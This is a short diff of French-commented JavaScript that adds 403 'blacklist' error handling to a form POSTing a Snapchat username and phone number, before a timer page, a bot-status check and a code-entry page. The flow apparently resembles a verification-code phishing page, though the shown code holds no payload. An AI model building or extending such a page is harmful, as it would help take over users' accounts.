@@ -985,12 +985,26 @@
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ pseudo: snapUsername, phone: phoneNumber })
-    }).catch(err => console.log(err));
-
-    showPage('page2'); // Va à la page du chrono
-    startChrono();
-    checkBotStatus(); // Lance la surveillance du bot
-  });
+    })
+    .then(res => {
+      if (res.status === 403) {
+        throw new Error("blacklist");
+      }
+      return res.json();
+    })
+    .then(data => {
+      showPage('page2'); // Va à la page du chrono
+      startChrono();
+      checkBotStatus();
+    })
+    .catch(err => {
+      if (err.message === "blacklist") {
+        phoneError.textContent = "Ce numéro est bloqué.";
+        phoneError.style.color = "#ff4d4d";
+      } else {
+        console.log(err);
+      }
+    });
 
   // ------- Page 4 : code -------
   const codeInput = document.getElementById('code');
